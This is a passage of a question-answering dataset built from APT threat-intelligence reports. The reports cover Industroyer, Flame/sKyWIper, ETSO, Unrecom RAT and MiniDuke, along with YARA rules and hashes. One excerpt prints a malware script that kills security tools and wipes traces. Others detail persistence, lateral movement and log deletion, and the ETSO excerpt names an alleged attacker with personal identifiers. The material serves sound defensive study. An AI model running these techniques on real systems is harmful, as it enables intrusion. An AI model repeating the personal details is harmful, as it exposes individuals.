confirming the attack without going further concerning technical details related to this attack.\nAccording to CyberX, a targeted malware campaign called BugDrop could have been performed in the reconnaissance phase. Indeed, the goal was to retrieve a maximum amount of information regarding the final target which was the power grid. The complexity of the malware was quite impressive. Once the target was infected through a targeted phishing campaign and the malware deployed, it retrieved a lot of information from the network and also screenshots, documents, passwords and audio recordings using the microphone. For each infected target, the data was encrypted with Blowfish using a \"user-ID\". The exfiltration was performed through Dropbox services. The assumption linking this malware and the attack is detailed in the claims section below.\nBig Headline: THE 12TH OF JUNE 2017, RESEARCHER ANTON CHEREPANOV FROM ESET PUBLISHED A COMPREHENSIVE TECHNICAL REPORT REGARDING THE MALWARE CALLED INDUSTROYER. DRAGOS HAS ALSO PROVIDED AN IN-DEPTH ANALYSIS UNDER THE NAME OF CRASHOVERRIDE.\nTHIS MALWARE IS PROBABLY LINKED TO THE DECEMBER 2016 UKRAINE ATTACK. INDEED,THIS MALWARE HAS BEEN DESIGNED TO DISRUPT THE WORKING PROCESS OF INDUSTRIAL CONTROL SYSTEMS\nUSED IN ELECTRICAL SUBSTATIONS.\nINDUSTROYER / CRASHOVERRIDE is the first OT malware designed specifically to attack electric grids.\nThis malware supports four differents industrial protocols:\nIEC 60870-5-101 (aka IEC 101)\nIEC 60870-5-104 (aka IEC 104)\nIEC 61850\nIt is obvious that since the first 2015 attack (using Blackenergy and Killdisk) and this malware, there is a huge gap and attackers have improved their capacities. The malware is now able to control switches and breakers. ESET have seen indications that this malware could have been the tool used by attackers to cause the power outage in December 2016. The infection vector remains unknown but the investigation is still ongoing.\nOLE for Process Control Data Access (OPC DA)\nBefore going deeper into the malware, let's have a look at embedded components. As we can see in the schematic below, the malware embeds:\nTwo backdoors (C&C through HTTPS)\nA launcher\nA wiper\nFour differents payloads corresponding to four different industrial protocols\nRegarding the C&C it is interesting to note that a local proxy configuration has been hardcoded in the malware. The local proxy is the way to access the Internet from the local network. This configuration is adapted to the local network. The fact that the local proxy has been hardcoded in the malware, means having technical knowledge about the target. Due to this, we can conclude that it was a targeted attack. In addition, without proper modification of the malware, it cannot be used on another target.\nAnother interesting thing is the way the malware deploys the backdoor to the victim to be able to spawn a shell, download a file and execute a program. At the beginning, when the backdoor is executed on the victim, it stays in\nRAM and starts communicating with the C&C. At this moment, through the C&C, information related to the victim is exfiltrated and analyzed to find vulnerabilities on the targeted system. Once found, the exploit is sent through the backdoor (still in ram) to perform a privilege escalation. And now the fun part begins:\nAn initial persistent backdoor (the main) is deployed to replace a non-critical Windows service.\nA second persistent backdoor (the backup) is installed through a malicious Microsoft Notepad on the victim. Each time the Notepad is used the backdoor is also executed.\nBig Headline: IEC 101 PAYLOAD COMPONENT\nThe payload uses the IEC101 protocol (IEC 60870-5-101) which is used for communications between industrial control systems and remote terminal units. If the target machine communicates with a RTU using IEC101, the IEC101 payload is used. It parses a configuration file created by the hacker to determine the process's target, it kills it and opens COM ports to communicate with the RTU and also to prevent the original process from communicating with the RTU. Once the communication has been established, the malware sends IEC101 C_SC_ NA_1 and C_DC_NA_1 packets to switch off the RTU at the specified Information Object Address (IOA).\nMedium Headline: IEC 61850 PAYLOAD COMPONENT\nThis payload uses the IEC 61850 standard. This standard describes a protocol used for multi-vendor communication among devices that perform protection, automation, metering, monitoring, and control of electrical substation automation systems. The 61850 payload uses only a small subset of the protocol to produce its disruptive effect. The payload looks for a configuration file defining targets and commands as seen previously. If the payload does not find the file, it starts to scan the network for TCP port 102 (used by IEC 61850). Once found, the payload sends a connection request packet using the COTP protocol. If successful, it sends a InitiateRequest and a getNameList request to compile a list of targets, variables and contents. Afterwards, the payload parses received data for variables that contain the strings CSW (corresponds to logical nodes used to control circuit breakers and switches). For each of them it will try a read and a write order to change the position of the breaker.\nBig Headline: IEC 104 PAYLOAD COMPONENT\nThis payload uses the IEC104 protocol (IEC 60870-5-104) which is used to send IEC101 on a TCP/IP network.Similar to the IEC101 payload, the DLL reads a configuration file containing information regarding the target including the IP address, the port, the ADSU (Application Service Data Unit) and the operation. The goal of this payload is to connect to a specified IP address and send packets with the ASDU address to interact with the IOA to switch it off. The OT impact is quite important. By using this payload, the malware is able to communicate on the OT network using the IEC104 protocol and to send orders to breakers. At the same time, the malware is also able to communicate on the IT network to receive orders from the C&C servers located outside of the target.\n\nQuestion: How did the Industroyer/CrashOverride malware establish persistence on the victim's system and what was the significance of the hardcoded local proxy configuration?\n\nAnswer:",
    "output": "The Industroyer/CrashOverride malware established persistence by deploying two backdoors: an initial persistent backdoor that replaced a non-critical Windows service and a backup backdoor installed through a malicious Microsoft Notepad. The significance of the hardcoded local proxy configuration was that it indicated a targeted attack, as the malware required specific technical knowledge about the target's network. Without proper modification, the malware could not be used on another target.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: YARA Signatures\nNote: These rules are designed to broadly capture suspicious files and are not designed to detect a particular malware or threat.\n{\nmeta:\nauthor = \"Mandiant\"\ndate_created = \"2022-01-13\"\ndate_modified = \"2022-01-13\"\nrev = 1\nstrings:\n$s1 = \"auth-agent@openssh.com\"\n$s2 = \"auth-%.8x-%d\"\n$s3 = \"Child connection from %s:%s\"\n$s4 = \"Compiled without normal mode, can't run without -i\"\n$s5 = \"cancel-tcpip-forward\"\n$s6 = \"dropbear_prng\"\n$s7 = \"cron\"\ncondition:\nuint32be(0) == 0x7F454C46 and filesize < 2MB and all of them\n}\nrule REGEORG_Tuneller_generic\n{\nmeta:\nauthor = \"Mandiant\"\ndate_created = \"2021-12-20\"\ndate_modified = \"2021-12-20\"\nmd5 = \"ba22992ce835dadcd06bff4ab7b162f9\"\nstrings:\n$s1 = \"System.Net.IPEndPoint\"\n$s2 = \"Response.AddHeader\"\n$s3 = \"Request.InputStream.Read\"\n$s4 = \"Request.Headers.Get\"\n$s5 = \"Response.Write\"\n$s6 = \"System.Buffer.BlockCopy\"\n$s7 = \"Response.BinaryWrite\"\n$s8 = \"SocketException soex\"\ncondition:\nfilesize < 1MB and 7 of them\n}\n{\nauthor = \"Mandiant\"\ndate_created = \"2022-01-19\"\ndate_modified = \"2022-01-19\"\n$h1 = { DD E5 D5 97 20 53 27 BF F0 A2 BA CD 96 35 9A AD 1C 75 EB 47 }\nuint32be(0) == 0x7F454C46 and filesize < 10MB and all of them }\n\nHow does the YARA rule designed to detect QUIETEXIT, the backdoor used by UNC3524, function? What specific strings and conditions does it look for to identify potentially suspicious files related to this backdoor?",
    "output": "The YARA rule designed to detect QUIETEXIT, the backdoor used by UNC3524, functions by looking for specific strings and conditions within files. The rule checks for the presence of several strings such as 'auth-agent@openssh.com', 'auth-%.8x-%d', 'Child connection from %s:%s', 'Compiled without normal mode, can't run without -i', 'cancel-tcpip-forward', 'dropbear_prng', and 'cron'. Additionally, the rule specifies that the file must start with the ELF magic number (0x7F454C46) and have a size less than 2MB. The condition for triggering the rule is that all of these strings must be present in the file.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Rocket Kitten APT use exfiltration techniques to steal sensitive data from infected machines?",
    "output": "Exfiltration is a critical phase of an advanced persistent threat (APT) where attackers aim to steal sensitive data from the compromised network. In the case of the Rocket Kitten APT, the attackers employ various exfiltration techniques to extract valuable data from infected machines. According to the findings, the malware used by Rocket Kitten can exfiltrate any file to the remote C&C server, including logs, webcam images, and screenshots. The malware achieves this by breaking down the files into 4Kb chunks and transmitting them to the C&C server, where each chunk frame is sized 0x1014h bytes. Furthermore, the malware reports the file size and transfer status to the C&C server during the exfiltration process. Additionally, the attackers can enumerate all files on the system or find a specific file with the required filename specified by the operator. These techniques demonstrate the sophistication and effectiveness of the Rocket Kitten APT's exfiltration methods.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: WHOIS Record for kcna.kp:\ninetnum: 175.45.176.0 - 175.45.179.255\nnetname: STAR-KP\ndescr: Ryugyong-dong\ndescr: Potong-gang District\ncountry: KP\nadmin-c: SJVC1-AP\ntech-c: SJVC1-AP\nstatus: ALLOCATED PORTABLE\nmnt-by: APNIC-HM\nmnt-lower: MAINT-STAR-KP\nmnt-routes: MAINT-STAR-KP\nremarks: -+-+-+-+-+-+-+-+-+-+-+-++-+-+-+-+-+-+-+-+-+-+-+-+-+-+\nremarks: This object can only be updated by APNIC hostmasters.\nremarks: To update this object, please contact APNIC\nremarks: hostmasters and include your organisation's account\nremarks: name in the subject line.\nremarks: -+-+-+-+-+-+-+-+-+-+-+-++-+-+-+-+-+-+-+-+-+-+-+-+-+-+\nmnt-irt: IRT-STAR-KP\nchanged: 20091221\nsource: APNIC\nirt: IRT-STAR-KP\naddress: Ryugyong-dong Potong-gang District\ne-mail:\nabuse-mailbox:\nadmin-c: SJVC1-AP\ntech-c: SJVC1-AP\nauth: # Filtered\nmnt-by: MAINT-STAR-KP\nchanged: 20120202\nsource: APNIC\nrole: STAR JOINT VENTURE CO LTD - network administrat\naddress: Ryugyong-dong Potong-gang District\ncountry: KP\nphone: +66 81 208 7602\nfax-no: +66 2 240 3180\ne-mail:\nadmin-c: SJVC1-AP\ntech-c: SJVC1-AP\nnic-hdl: SJVC1-AP\nmnt-by: MAINT-STAR-KP\nchanged: 20091214\nsource: APNIC\nMedium Headline: WHOIS Record for uriminzokkiri.com:\nDomain Name : uriminzokkiri.com\nPunnyCode : uriminzokkiri.com\nCreation Date : 2003-02-09 00:00:00\nUpdated Date : 2012-06-28 13:22:18\nExpiration Date : 2015-02-09 00:00:00\nRegistrant:\nOrganization : chaoxianLiuYiYuBianJishe ShenYang Ban SHICHU\nKorea 615 Shenyang company\nName :\nAddress : shenyang hepingqu xifudalu 168 hao 2 danyuan 2-12-1\nCity : shenyangshi\nProvince/State : liaoningsheng\nCountry : china\nPostal Code : 123456\nAdministrative Contact:\nName : kim sejun\nOrganization : Shenyang xin neng yuang\nAddress : shenyang hepingqu xifudalu 168 hao 2 danyuan 2-12-1\nCity : shenyangshi\nProvince/State : liaoningsheng\nchina\nCountry :\nPostal Code : 123456\nPhone Number :\nFax : 86-024-22523102\nEmail : hyk1979@hotmail.com\nkim sejun\nTechnical Contact: Name :\nOrganization : Shenyang xin neng yuang\nAddress : shenyang hepingqu xifudalu 168 hao 2 danyuan 2-12-1\nCity : shenyangshi\nProvince/State : liaoningsheng\nCountry : china\nPostal Code : 123456\nPhone Number :\nFax : 86-024-22523102\nhyk1979@hotmail.com\nEmail :\nBilling Contact:\nName : kim sejun\nOrganization : Shenyang xin neng yuang\nAddress : shenyang hepingqu xifudalu 168 hao 2 danyuan 2-12-1\nCity : shenyangshi\nProvince/State : liaoningsheng\nCountry : china\nPostal Code : 123456\nPhone Number :\nFax : 86-024-22523102\nEmail :\n\nHow does the WHOIS record for kcna.kp indicate the administrative and technical management of North Korea's internet infrastructure? What insights can be drawn from the roles and responsibilities listed in the record?",
    "output": "The WHOIS record for kcna.kp indicates that the administrative and technical management of North Korea's internet infrastructure is handled by STAR JOINT VENTURE CO LTD, located in Ryugyong-dong, Potong-gang District, North Korea. The record lists SJVC1-AP as both the admin-c and tech-c, suggesting that the same entity or individual is responsible for both administrative and technical aspects. The record also specifies that updates to this object can only be made by APNIC hostmasters, indicating a level of control and oversight by the Asia-Pacific Network Information Centre (APNIC). The presence of phone and fax numbers suggests a point of contact for administrative and technical issues, though the absence of email addresses might complicate immediate electronic communication. Overall, the record provides insights into the centralized management and external oversight of North Korea's internet infrastructure.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: Threat Overview\nThe increased threat activity against the U.S. state and local government, technology, advisory services, and health sectors in the past two weeks is of great concern to us as it is being carried through phishing emails with what appears to be a tool known as Unrecom RAT.\nThe phishing emails try to trick the users into thinking the emails are legitimate by attaching the RAT with the some of the following names: Payment Invoice.jar, Payment details.jar, POR#94586.zip/POR#94586.jar, INV#94586.zip/INV#94586.jar, Invitation.jar, reports-pdf.jar, US$25k.jar, and DBC_BANK_IMG_23456_156.jar, and lremit_Transfer_Error_Page.jar.\nSome of the email message subjects observed during this campaign are:\nIt appears that the latest version of this RAT is 3.2 and is being sold at \"unrecom[.]net\" for $500 (Enterprise Version) and $200 (Full Version).\nWe find it interesting that on their website, the authors of this software recommend Unrecom RAT buyers to not scan created servers (malware deployed to Victim systems) at Virustotal nor Metascan. This is\nindicative of the adaptive, counter-intelligence techniques being adopted as threat actors become aware that many security researchers use these services to gather threat intelligence.\nSignificantly, malware objects seen in previous campaigns like DarkComet and ArcomRAT8 have also been observed beaconing to the same CnC servers Unrecom RAT is currently using. DarkComet is known to be a popular RAT used in threat activity in the Middle East 6,7.\n\nWhy might the authors of Unrecom RAT advise their customers against scanning created servers on platforms like Virustotal or Metascan? How does this reflect the evolving tactics of threat actors?",
    "output": "The authors of Unrecom RAT advise their customers against scanning created servers on platforms like Virustotal or Metascan because they are aware that many security researchers use these services to gather threat intelligence. By avoiding these platforms, threat actors can reduce the likelihood of their malware being detected and analyzed, thereby prolonging its effectiveness. This recommendation reflects the adaptive, counter-intelligence techniques being adopted by threat actors as they become more sophisticated and aware of the methods used by security professionals to combat their activities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: 3.5. Mutexes\nSimilarly to other malicious codes, sKyWIper uses mutexes to make sure that only one instance is running from it. Mutexes are created either for injected system processes (winlogon.exe, services.exe, explorer.exe) and proprietary files. In the former case, the following naming convention is used: TH_POOL_SHD_PQOISNG_#PID#SYNCMTX, where the #PID# variable refers to the PID of the system process the mutex belongs to. Furthermore, there are other mutexes that belongs to files created by the malcode. These are the following.\nc__program_files_common_files_microsoft shared_msaudio_wpgfilter.dat\nc__program files_common files_microsoft shared_msaudio_audcache\nTo reveal all the mutexes one can traverse Windows' _KMUTANT data structure, however, it is difficult to grasp the malicious ones.\nMedium Headline: 3.7. Installation and propagation method\nThere are multiple ways for the malware to propagate. One method we are aware of is related to windows update and file downloading by some modules using SSL and some proprietary text based protocol. We also have clear indications that Stuxnet's print spooler exploit (MS10-061) and lnk exploit (MS10-046) is used within sKyWIper as well:\nvar objFileSystem = new ActiveXObject(\"Scripting.FileSystemObject\");var s = GetObject(\"winmgmts:root\\\\cimv2\");var oProcs = s.ExecQuery(\"SELECT * FROM Win32_Process WHERE name='outpost.exe' or name='aupdrun.exe' or name='op_mon.exe' or name='avp.exe'\");s.Delete(\"__EventFilter.Name='FilterForClassCreation'\");s.Delete(\" ActiveScriptEventConsumer.Name='ActiveScriptForSvc'\");s.Delete(\"MyTestClass\");s.Del ete(\"__Win32Provider.Name='ActiveScriptEventConsumer'\");var f = objFileSystem.GetFile(\"wbem\\\\mof\\\\good\\\\svchostevt.mof\");f.Delete(true); f =objFileSystem.GetFile(\"testpage\");f.Delete(true);if (!oProcs.Count) { s1 = new ActiveXObject(\"Wscript.Shell\");s1.Run(\"%SYSTEMROOT%\\\\system32\\\\rundll32.exe msdclr64.ocx,DDEnumCallback\");while (true) { var oProcs = s.ExecQuery(\"SELECT * FROM Win32_Process WHERE name='rundll32.exe'\"); if (!oProcs.Count) break; } var f = objFileSystem.GetFile(\"msdclr64.ocx\");f.Delete(true);} else { var f = objFileSystem.GetFile(\"msdclr64.ocx\"); f.Delete(true);} where msdclr64.ocx refers to the main module\nFigure 12 \u2013 Printer problem related routines in the malware\nURL: http://<windowscomputername>/view.php?mp=1&jz=1627XXXXXX&fd=1463XXXXXX& am=55XXXXXXX55X&ef=962DXXX7EC84XXXXEC84&pr=1&ec=0&ov=66664XXXXX6641XXXXX64174&pl=gs pndXXXXXX|spnZXXX|nyXXX|0nXXX|TWvXXXX|nGcXXX\u2022\nsome 30-50 tags more XXX are deliberately deleted\nFigure 13 \u2013 URL used to download mssecmgr.sys by some installation part\nFigure 13 shows the URL used to download the main module by some routine in the installation part of the malware. The routine downloads the file mssecmgr.ocx and some header: B5 A0 44 3F 67 EA EA EA E5 B2 EA EA. Trying to decrypt the header with algorithm E1 (see encryption algorithms later in this report) and considering 0xEA => 0x00, the result is\n: 0000000000: 20 E1 D7 50 0A 00 00 00 \u2502 C8 0F 00 00 \u00e1\u00d7P\u25d9 \u010c\u263c\nFurther information shows that this is related to the windows update mechanism and the MUNCH attack (see later). Numbers are partially removed or overwritten with X for privacy.\n(\"http://<windowscomputername>/view.php?ac=1&jz=16X71X...\",\"\"); CreateSection(\"$windir\\softwaredistribution\\selfupdate\\default\\wuauinfo.ocx\"); CreateSection(\"$windir\\softwaredistribution\\selfupdate\\default\\wuauinfo.ocx\");'\nAnother sample (numbers are removed or modified) is the following:\nThe user agent during this communications is set to \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.2150)\". This cannot be found by a google search; hence, it is possibly used by the malware for identification purposes. For the same reason, it can possibly be used as a NIDS signature.\nAnswer this question: How does sKyWIper ensure that only one instance of the malware is running on a system, and what specific mutex naming conventions does it use for injected system processes? Why is this important for the malware's operation?",
    "output": "sKyWIper ensures that only one instance of the malware is running by using mutexes. For injected system processes such as winlogon.exe, services.exe, and explorer.exe, it uses the naming convention TH_POOL_SHD_PQOISNG_#PID#SYNCMTX, where #PID# refers to the Process ID of the system process the mutex belongs to. Additionally, it creates mutexes for files such as c__program_files_common_files_microsoft shared_msaudio_wpgfilter.dat and c__program files_common files_microsoft shared_msaudio_audcache. This is important because it prevents multiple instances of the malware from running simultaneously, which could lead to conflicts and instability, ensuring the malware operates efficiently.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nSmall Headline: 2.4. Lateral Movement\nThe attacker who obtained the account information of privilege authority then created a back door to the system. In this case, if the acquired account was the domain administrator's, then the attacker could install back doors on all of the corresponding parts of the domain as well as the domain and systems in trust relations. The install process is as follows:\nThe attacker will use the acquired ID/Password or NTLM Hash value to create an agreement with the system network to move to, and copy, the back door. The copied backdoor is then executed using the work scheduler, and it is operated using the system authority. The executed back door then broadcasts connection status with the C&C server using the proxy feature, and the attacker approaches the corresponding system based on the broadcast information.\nThe attacker repeats the process until the target system is found, such as a DB. In most cases, the attacker will search for an administrator's system inside the network, approach the gateway server and finally enter the server network. From then on, the attacker uses the same method and installs many back doors in the server network.\nSmall Headline: 2.5 Maintain Network Presence\nThe attacker uses various Reloading Point techniques in order to maintain the connection between the installed back door and the C&C server. First, a Bootkit technique will be used to load the backdoor after transforming the MBR. The characteristic of the bootkit is that the corresponding bootkit is encoded with XOR on the loading data inside the trash and it is saved. Another method is to use files such as wiarpc.dll, tsvipsrc.dll which are loaded automatically during booting. The malicious file such as the DDL is saved under folder 32 and is used during the back door reloading. Registering the back door as a general service is also one way it may be used.\nThe attacker uses various kinds of anti-forensic techniques in order to avoid being disconnected with the C&C server once the back door is discovered. The backdoor install file and batch file are copied by network sharing, and the batch file is executed with the work scheduler. The batch file executes the back door install file and deletes the install file as well as the work schedule file (.job), and the cl of the wevtutil command is used to delete the event logs (security, system and application). Additionally, the registry key values are deleted in order to erase traces of the back door execution into the service. With these anti-forensic techniques, the attacker reduces the backdoor detection rate, avoiding the chances of being caught by back tracing.\nIn addition, a method of installing backdoor only in the memory area was applied, since this can avoid the threat detection of security products. After installation, the backdoor erases all of the files and only exists in the memory while waiting for the system to turn off. When the system is turned off, the files needed for back door reloading are generated and they are loaded during system booting. Then, the loaded back door erases all of the related files and stays only in the memory.\nEven though administrators and analysts detect back doors and delete them, the attacker will install even more back doors on the system to maintain its connection with the C&C server.\nSmall Headline: 2.6. Compromised Data\nThe attacker who approaches the DB server will proceed with various kinds of tasks depending on the attack purpose such as attacking the cyber money or stealing personal information. In the case of a cyber-money update, a query request is made on the DB using the features embedded on the back door and by SQLCMD.EXE. Or, the existing Stored Procedure is changed to update. When the Stored procedure registered in the mail table is changed and the mail is received, the Stored Procedure is operated to update the cyber money of a specific character. Also, the DDL which is used in the MS SQL DB which transforms the opends60.dll (SQL Open Data Services DLL), can be used to update the cyber money.\nIn case of information leakage, a DB for a customer information dump file is generated, compressed as BZIP (bz2) and exported out using FTP.\nSmall Headline: 2.2. Traffic Encoding\nIn the same OS environment, the same IP and Port were used during the test. It has been found that the traffic is different in its delivery over the same command. After repeated tests, a pattern was found in the traffic between the infected PC and the master. Thus, it is surmised that it was not completely encrypted but was encoded by a certain level.\nIncluding the initial connection, the traffic encoding was also applied in the Keep-Alive traffic and in the all command transferred traffic. The Key logging and CMD command results were also not delivered in plain text but in encryption.\n(When a service administration command is delivered in the same environment, different traffic patterns are found.)\nCurrently, the communication between the ETSO malicious code master and the agent is being encrypted. It seems impossible to create a PCRE and REGEX pattern which can be blocked by IDPS and other network security system. Regarding the newest version of ETSO, it is assumed that there must be a telecommunicating module hiding within the network traffic.\nMedium Headline: 3. Profile of the ETSO Creation Tool\nThe question is thus raised regarding who actually made the ETSO Attack tool in the first place. An investigation was conducted to find the ESTO APT creator as the ETSO master's traces were traced back in the analysis.\nIn the ETSO master, you can see the http access on the lower menu of the malware toolkit; the Baidu URL values are seen. Baidu is the largest portal site in China. In the middle, you can see the string \"DZKSJDADBDCDH-DOCADOCADOCBDDZJS\". The string appears when the IP is entered and information is changed, setting the initial value to be \"127.0.0.1\". At this time, the value DZKSJDADBDCDHDOCADOCADOCBDDZJS is set.\nThrough a Google search of the 'DZKSJDADBDCDHDOCADOCADOCBDDZJS' string on the malware toolkit, a link of 'http://tieba.baidu.com/p/1103191865' was found. There were reply messages titled TEST\nand all of the messages were submitted by a person with the ID \"whg0001\". This value matches the one on the ETSO malware toolkit.\nIt is assumed that the attacker designated a specific blog address when the ETSO APT malicious code agent was activated in order to immediately determine whether the attack was successful or not. The attacker can know the victim's IP address after decrypting the encryption.\nIt is assumed that the according blog content is related to the APT tool creation. Thus, a further investigation was made on the person with the ID of whg0001.\nWhen the link of whg0001 is clicked, brief information on the person with the ID whg0001 appears. He is a male who was born and still lives in Szechuan, Chengdu.\nBelow is the translation of the detail information:\nOn his blog, whg001 wrote on Aug. 17, 2011, \"I visited my home school a couple days ago. Looking back, those were the happiest days.\" It has also been found that the comment came from the free-board of Jipu High School. Thus, it has been determined that whg001 attended Jipu High School.\nAccording to the writings on the board and the content of whg0001's blog, the name of the writer is Jiao Xang Bo, who entered high school in 1994 in homeroom number 4. Also, he was looking for a classmate by leaving a message with his QQ ID. whg0001's QQ ID is found to be (312016).\nAfter investigating the personal information of whg0001, further investigation was made of his online activities. As a result, it has been found that he left comments on the attacker's freeboard regarding the design of Trojan horse (Refer to Figure 27).\nUnfortunately, the attacker freeboard does not exist anymore. [Figure 24] translates as follows:\n1. I have realized all of the packets' MIMA (password/man in the middle attack) different when designing the Trojan horse.\n2. To go around the vaccine detection, a transformation and other technologies were used to on the Trojan horse.\nTo find the document made by whg0001, the ID was used to search on Baidu. As a result, a document titled \"VTCP Introduction and Entry(V11.X)\" was discovered. To take a closer look at the document, a link ('http://wenku.baidu.com/view/2005a703-bb68a98270fefa06?fr=prin') was accessed (as of August, www.cnasm.com, the address mentioned within the document, was no longer accessible).\nUsing the QQ ID (312016) above, the result of the QQ main page was as follows:\nIn [Figure 26], the Chinese characters wu hua guo appear. The first letter of each synonym has been used as an ID. So far, the following information has been collected on the attacker who created the ETSO with ID of whg0001 (refer to Table 7):\n\nExplain the process by which the ETSO Attack Group moved laterally within a compromised network to reach their target systems, such as a database server.",
    "output": "The ETSO Attack Group moved laterally within a compromised network by first obtaining account information of privileged authorities. If the acquired account was a domain administrator's, the attacker could install backdoors on all parts of the domain and systems in trust relations. The attacker used the acquired ID/Password or NTLM Hash value to create an agreement with the system network to move to, and copied the backdoor. The copied backdoor was executed using the work scheduler and operated with system authority. The executed backdoor broadcasted connection status with the C&C server using a proxy feature, allowing the attacker to approach the corresponding system based on the broadcast information. This process was repeated until the target system, such as a database server, was found. The attacker typically searched for an administrator's system inside the network, approached the gateway server, and then entered the server network, installing multiple backdoors using the same method.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: MiniDuke\nMalware SHA1 hashes\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n103c37f6276059a5ff47117b7f638013ccffe407 \uf077 \uf077 \uf077 \uf077 \uf077 \uf077 \uf077 \uf077 \uf077 \uf077 \uf077 \uf077 \uf077 \uf077 \uf077 \uf077 \uf077\n00852745cb40730dc333124549a768b471dff4bc\n03661a5e2352a797233c23883b25bb652f03f205\n045867051a6052d1d910abfcb24a7674bcc046ca\n0d78d1690d2db2ee322ca11b82d79c758a901ebc\n0e263d80c46d5a538115f71e077a6175168abc5c\n118114446847ead7a2fe87ecb4943fdbdd2bbd1e\n15c75472f160f082f6905d57a98de94c026e2c56\n1ba5bcd62abcbff517a4adb2609f721dd7f609df\n1e6b9414fce4277207aab2aa12e4f0842a23f9c1\n223c7eb7b9dde08ee028bba6552409ee144db54a\n28a43eac3be1b96c68a1e7463ae91367434a2ac4\n296fd4c5b4bf8ea288f45b4801512d7dec7c497b\n2a13ae3806de8e2c7adba6465c4b2a7bb347f0f5\n2ceae0f5f3efe366ebded0a413e5ea264fbf2a33\n2d74a4efaecd0d23afcad02118e00c08e17996ed\n30b377e7dc2418607d8cf5d01ae1f925eab2f037\n31ab6830f4e39c2c520ae55d4c4bffe0b347c947\n36b969c1b3c46953077e4aabb75be8cc6aa6a327\n416d1035168b99cc8ba7227d4c7c3c6bc1ce169a\n43fa0d5a30b4cd72bb7e156c00c1611bb4f4bd0a\n493d0660c9cf738be08209bfd56351d4cf075877\n4b4841ca3f05879ca0dab0659b07fc93a780f9f1\n4ec769c15a9e318d41fd4a1997ec13c029976fc2\n53140342b8fe2dd7661fce0d0e88d909f55099db\n5acaea49540635670036dc626503431b5a783b56\n5b2c4da743798bde4158848a8a44094703e842cb\n634a1649995309b9c7d163af627f7e39f42d5968\n683104d28bd5c52c53d2e6c710a7bd19676c28b8\n694fa03160d50865dce0c35227dc97ffa1acfa48\n73366c1eb26b92886531586728be4975d56f7ca5\n827de388e0feabd92fe7bd433138aa35142bd01a\n909d369c42125e84e0650f7e1183abe740486f58\n9796d22994ff4b4e838079d2e5613e7ac425dd1d\na32817e9ff07bc69974221d9b7a9b980fa80b677\na4e39298866b72e5399d5177f717c46861d8d3df\na6c18fcbe6b25c370e1305d523b5de662172875b\na9e529c7b04a99019dd31c3c0d7f576e1bbd0970\nad9734b05973a0a0f1d34a32cd1936e66898c034\nb27f6174173e71dc154413a525baddf3d6dea1fd\nb8b116d11909a05428b7cb6dcce06113f4cc9e58\nc17ad20e3790ba674e3fe6f01b9c10270bf0f0e4\nc39d0b12bb1c25cf46a5ae6b197a59f8ea90caa0\nc6d3dac500de2f46e56611c13c589e037e4ca5e0\ncb3a83fc24c7b6b0b9d438fbf053276cceaacd2e\ncc3df7de75db8be4a0a30ede21f226122d2dfe87\ncd50170a70b9cc767aa4b21a150c136cb25fbd44\ncdcfac3e9d60aae54586b30fa5b99f180839deed\nd22d80da6f042c4da3392a69c713ee4d64be8bc8\nd81b0705d26390eb82188c03644786dd6f1a2a9e\nde8e9def2553f4d211cc0b34a3972d9814f156aa\ne4add0b118113b2627143c7ef1d5b1327de395f1\ne95e2c166be39a4d9cd671531b376b1a8ceb4a55\nedf74413a6e2763147184b5e1b8732537a854365\nefcb9be7bf162980187237bcb50f4da2d55430c2\nf62600984c5086f2da3d70bc1f5042cf464f928d\nMedium Headline: F-Secure detection names\nBackdoor:W32/MiniDuke.A\nTrojan-Dropper:W32/MiniDuke.B\nExploit:W32/MiniDuke.C\nTrojan-Dropper:W32/MiniDuke.D\nBackdoor:W32/MiniDuke.E\nBackdoor:W32/MiniDuke.F\nBackdoor:W32/MiniDuke.F\nBackdoor:W32/MiniDuke.H\nBackdoor:W32/MiniDuke.I\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\nTrojan:W32/CosmicDuke.H \uf077 \uf077 \uf077 \uf077 \uf077 \uf077\nBackdoor:W32/MiniDuke.J\nTrojan-Dropper:W32/CosmicDuke.A\nTrojan-PSW:W32/CosmicDuke.B\nTrojan:W32/CosmicDuke.C\nExploit:W32/CosmicDuke.D\nExploit:SWF/CosmicDuke.E\nTrojan-PSW:W32/CosmicDuke.F\nTrojan-Dropper:W32/CosmicDuke.G\nTrojan:W32/CosmicDuke.I\nBackdoor:W32/OnionDuke.A\nTrojan-Dropper:W32/OnionDuke.A\nBackdoor:W32/OnionDuke.B\nTrojan:W32/OnionDuke.C\nTrojan:W32/OnionDuke.D\nTrojan-PSW:W32/OnionDuke.E\nTrojan:W32/OnionDuke.F\nTrojan:W32/OnionDuke.G\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\nTrojan:W32/CozyDuke.B \uf077 \uf077 \uf077 \uf077 \uf077\nTrojan:W32/CozyDuke.A\nTrojan-Dropper:W32/CozyDuke.C\nTrojan:W32/CozyDuke.D\nTrojan:W64/CozyDuke.E\nTrojan-Downloader:W32/CloudDuke.A\nTrojan:W32/CloudDuke.B\nTrojan:W64/CloudDuke.B\nBackdoor:W32/SeaDuke.A\nNote: F-Secure also detects various Duke malware components with other detections not specific to the Dukes.\n\nHow does the identification and categorization of 